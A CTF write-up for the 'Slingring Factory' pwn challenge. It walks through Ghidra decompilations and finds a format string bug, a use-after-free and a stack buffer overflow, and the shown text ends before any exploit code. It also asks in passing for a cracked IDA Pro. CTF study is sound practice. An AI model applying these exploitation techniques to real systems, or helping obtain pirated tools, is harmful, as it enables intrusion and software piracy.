            <content type="html"><![CDATA[<h2 id="slingring-factory">Slingring Factory</h2>
<p>Category: Pwn</p>
<p>In following Greycat&rsquo;s adventures, you have stumbled upon a factory that produces weirdly-shaped rings. Upon closer inspection, you realise that the rings seem very familiar &ndash; they looked exactly like the Sling Rings you saw from the Marvel Comics universe! Having some time leftover, you decide to explore the factory. Alas, you eventually come to realise that these Sling Rings were in fact not the same as those you knew: during forging, their destinations have to already be set. You wonder what you could do with these rings&hellip;</p>
<p>Author: uhg</p>
<p><code>nc challs.nusgreyhats.org 35678</code></p>
<br>
<h3 id="initial-analysis">Initial Analysis</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./checksec slingring_factory
</span></span><span class="line"><span class="cl">Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">Stack:    Canary found
</span></span><span class="line"><span class="cl">NX:       NX enabled
</span></span><span class="line"><span class="cl">PIE:      PIE enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ./slingring_factory
</span></span><span class="line"><span class="cl">What is your name?
</span></span><span class="line"><span class="cl">enxgmatic
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to my secret sling ring factory.
</span></span><span class="line"><span class="cl">What <span class="k">do</span> you want to <span class="k">do</span> today?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1. Show Forged Rings
</span></span><span class="line"><span class="cl">2. Forge Sling Ring
</span></span><span class="line"><span class="cl">3. Discard Sling Ring
</span></span><span class="line"><span class="cl">4. Use Sling Ring
</span></span><span class="line"><span class="cl">&gt;&gt;
</span></span></code></pre></div><p>At the start of the binary, there is a format string bug when they ask for our name. Otherwise, nothing of note, and we enter the <code>menu()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_16</span> <span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setup</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What is your name?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_16</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">local_16</span><span class="p">);</span>  <span class="c1">// format string bug!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">menu</span><span class="p">();</span>            <span class="c1">// go to menu()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>menu()</code> is boring and just prints the options, moving on&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_14</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_001018e9</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">cls</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to my secret sling ring factory.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What do you want to do today?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. Show Forged Rings&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2. Forge Sling Ring&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3. Discard Sling Ring&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4. Use Sling Ring&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_14</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">use_slingring</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">discard_slingring</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_001018e9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">show_slingrings</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_00101a05</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">forge_slingring</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_001018e9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00101a05</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid input!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press ENTER to go back...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_001018e9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Checking out <code>forge_slingring()</code> first, we are able to forge a max of 10 rings, with each ring being a fixed size chunk allocated by <code>malloc()</code>. It was at this point that I thought it was a heap challenge and I mentally noped myself out (I&rsquo;M SORRY I can barely heap guys).</p>
<p>Apart from controlling the index at which the rings will be, we can provide other input (the destination location &amp; amount of rings to forge), both of which are inconsequential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">forge_slingring</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_98</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the ring forge!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Which slot do you want to store it in? (0-9)</span><span class="se">\n</span><span class="s">This will override any existing rings!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Enter destination location:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_98</span> <span class="o">=</span> <span class="n">local_118</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Enter amount of rings you want to forge (1-9):&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">iVar2</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">iVar2</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">iVar2</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">pvVar3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x84</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">=</span> <span class="n">iVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="o">**</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">local_98</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">announcement</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;New ring forged!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d rings going to location [%s] forged and placed in slot %d.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">             <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">),(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">cls</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press ENTER to return.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">errorcl</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid amount!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press ENTER to go back...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">errorcl</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid amount!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press ENTER to go back...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Next, moving on to <code>discard_slingring()</code>, this function simply lets us free the allocated chunks (ie the rings). A Use-After-Free (UAF) bug is immediately visible: after using <code>free()</code>, the pointer to the chunk is not nullified.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">discard_slingring</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_14</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Which ring would you like to discard?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_14</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">local_14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mi">9</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">errorcl</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Press ENTER to go back...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">announcement</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;The ring slot is already empty!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">rings</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span> <span class="c1">// use after free bug!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Ring Slot #%d has been discarded.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">cls</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Finally, <code>show_slingrings()</code> simply prints out the value at each ring.</p>
<p>At this point, I got stuck. We have a UAF bug, but we can&rsquo;t overwrite anything. What can we use the format string exploit for? How are you meant to get shell??? It was at this moment I was considering quitting to try another challenge until&hellip;</p>
<br>
<h3 id="i-realise-i-am-blind">I realise I am blind</h3>
<p>So when you look at the ghidra decompilation of <code>menu()</code> below, what do you see?</p>
<img src='assets/slingring (1).png' width=60%>
<p>I hope you weren&rsquo;t as blind as me, because this is what I saw:</p>
<img src='assets/slingring (2).png' width=60%>
<p>And you know what I missed for a while? The <code>use_slingring()</code> function BRUHHHHHH. I don&rsquo;t know how my eyes just skipped over it but it did.</p>
<p><del>I&rsquo;m blaming ghidra and their decompilation</del> (Anyways randomly, does anybody know how to get a cracked IDA pro.)</p>
<img src='assets/slingring (3).png' width=60%>
<p>And guess what, <code>use_slingring()</code> was the key to the whole exploit.</p>
<br>
<h3 id="we-are-so-back">We are so back</h3>
<p>Taking a look at the forgotten function my eyes mysteriously blinked over, there is a buffer overflow bug with <code>fgets(local_48,0x100,stdin)</code>.</p>
<p>This entirely changed the challenge from what I had initially thought was a heap challenge, to a basic buffer overflow.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">use_slingring</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_4c</span> <span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">56</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Which ring would you like to use (id): &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_4c</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">atoi</span><span class="p">(</span><span class="n">local_4c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Please enter the spell: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span> <span class="c1">// buffer overflow!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Thank you for visiting our factory! We will now transport you.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Transporting...&#34;</span><span class="p">);</span>
